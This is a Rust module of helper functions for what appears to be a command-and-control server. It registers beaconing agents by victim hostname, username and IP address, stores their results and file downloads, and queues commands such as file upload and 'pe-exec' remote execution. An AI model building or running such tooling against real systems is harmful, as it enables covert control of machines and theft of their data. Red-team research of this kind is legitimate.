use axum::http::StatusCode;
use axum::response::Response;
use base64::{engine::general_purpose::STANDARD, Engine as _};
use std::sync::Arc;

use crate::agents::agent_handler::{AgentHandler, AgentInfo};
use crate::listener::http_listener::{AgentBeacon, CommandItem, ListenerState, ResultSubmit};

// ============================================================================
// RESPONSE HELPERS
// ============================================================================

pub fn empty_response(status: StatusCode) -> Response<String> {
    Response::builder()
        .status(status)
        .body(String::new())
        .unwrap()
}

pub fn text_response(status: StatusCode, body: String) -> Response<String> {
    Response::builder()
        .status(status)
        .header("Content-Type", "text/plain")
        .body(body)
        .unwrap()
}

pub fn json_response(status: StatusCode, body: String) -> Response<String> {
    Response::builder()
        .status(status)
        .header("Content-Type", "application/json")
        .body(body)
        .unwrap()
}

pub fn json_error(status: StatusCode, message: &str) -> Response<String> {
    let json = serde_json::json!({
        "success": false,
        "message": message
    });
    json_response(status, json.to_string())
}

pub fn json_success() -> Response<String> {
    let json = serde_json::json!({ "success": true });
    json_response(StatusCode::OK, json.to_string())
}

// ============================================================================
// AGENT HELPERS
// ============================================================================

pub fn update_or_register_agent(state: &Arc<ListenerState>, beacon: &AgentBeacon) {
    let timestamp = AgentHandler::get_current_timestamp();

    if let Some(mut agent) = state.agent_handler.get_agent(&beacon.agent_id) {
        agent.hostname = Some(beacon.hostname.clone());
        agent.username = Some(beacon.username.clone());
        agent.process_name = Some(beacon.process_name.clone());
        agent.ip = Some(beacon.ip_address.clone());
        agent.last_seen = timestamp;

        state
            .agent_handler
            .update_agent(&beacon.agent_id, agent, Some(&state.database));
    } else {
        log::info!("[+] New agent detected: {}", beacon.agent_id);

        let agent_info = AgentInfo {
            agent_id: beacon.agent_id.clone(),
            hostname: Some(beacon.hostname.clone()),
            username: Some(beacon.username.clone()),
            process_name: Some(beacon.process_name.clone()),
            ip: Some(beacon.ip_address.clone()),
            last_seen: timestamp,
            payload_type: "exe".to_string(),
            listener_name: state.profile.name.clone(),
            file_path: None,
        };

        state.agent_handler.register_agent(
            beacon.agent_id.clone(),
            agent_info,
            Some(&state.database),
        );
    }
}

pub fn process_beacon_results(state: &Arc<ListenerState>, beacon: &AgentBeacon) {
    log::info!("[+] Processing results from {}", beacon.agent_id);

    state
        .agent_handler
        .push_result(&beacon.agent_id, beacon.results.clone());

    let (output, result_type, filename) = parse_beacon_result(&beacon.results);

    if let Err(e) =
        state
            .database
            .store_result(&beacon.agent_id, None, &output, true, Some(result_type))
    {
        log::warn!("[!] Failed to store beacon result: {}", e);
    } else {
        log::info!(
            "[+] Result stored | type={} | file={:?} | size={}",
            result_type,
            filename,
            output.len()
        );
    }
}

// ============================================================================
// PARSING HELPERS
// ============================================================================

pub fn parse_beacon_result(results: &str) -> (String, &'static str, Option<String>) {
    if results.starts_with("File uploaded successfully")
        || results.starts_with("Upload successful")
        || results.starts_with("Error:")
    {
        return (results.to_string(), "text", None);
    }

    let decoded = match STANDARD.decode(results) {
        Ok(bytes) => String::from_utf8(bytes).unwrap_or_else(|_| results.to_string()),
        Err(_) => results.to_string(),
    };

    if decoded.starts_with("Error:") {
        return (decoded, "text", None);
    }

    let normalized = decoded.replace('\'', "\"");
    if let Ok(parsed) = serde_json::from_str::<serde_json::Value>(&normalized) {
        if let Some(content) = parsed.get("content").and_then(|v| v.as_str()) {
            let filename = parsed
                .get("filename")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());

            return (content.to_string(), "file_download", filename);
        }
    }

    (decoded, "text", None)
}

pub fn extract_result_content(result: &ResultSubmit) -> (String, Option<String>) {
    if result.r#types != "file" {
        return (result.output.clone(), None);
    }

    let decoded = match STANDARD.decode(&result.output) {
        Ok(bytes) => match String::from_utf8(bytes) {
            Ok(s) => s,
            Err(_) => return (result.output.clone(), None),
        },
        Err(_) => return (result.output.clone(), None),
    };

    if decoded.starts_with("Error:") || !result.success {
        return (decoded, None);
    }

    let normalized = decoded.replace('\'', "\"");
    match serde_json::from_str::<serde_json::Value>(&normalized) {
        Ok(parsed) => {
            let content = parsed
                .get("content")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());
            let filename = parsed
                .get("filename")
                .and_then(|v| v.as_str())
                .map(|s| s.to_string());

            match (content, filename.clone()) {
                (Some(c), Some(f)) => {
                    log::info!("[+] File parsed | name='{}' | size={}", f, c.len());
                    (c, Some(f))
                }
                _ => (decoded, None),
            }
        }
        Err(_) => (decoded, None),
    }
}

// ============================================================================
// COMMAND HELPERS
// ============================================================================

pub fn fetch_commands_with_data(state: &Arc<ListenerState>, agent_id: &str) -> Vec<CommandItem> {
    let mut commands = Vec::new();

    let pending = match state.database.get_pending_commands(agent_id) {
        Ok(cmds) => cmds,
        Err(e) => {
            log::error!("[!] Failed to fetch commands: {}", e);
            return commands;
        }
    };

    for (cmd_id, cmd) in pending {
        let command = if cmd.contains("'upload':") {
            state
                .database
                .get_upload_data_for_command(cmd_id)
                .ok()
                .flatten()
                .map(|data| format!("'upload':'{}'", data))
                .unwrap_or(cmd)
        } else if cmd.contains("'pe-exec':") {
            state
                .database
                .get_pe_exec_data_by_command(cmd_id)
                .ok()
                .flatten()
                .map(|data| format!("'pe-exec':'{}'", data))
                .unwrap_or(cmd)
        } else {
            cmd
        };

        commands.push(CommandItem {
            id: cmd_id,
            command,
        });
    }

    commands
}
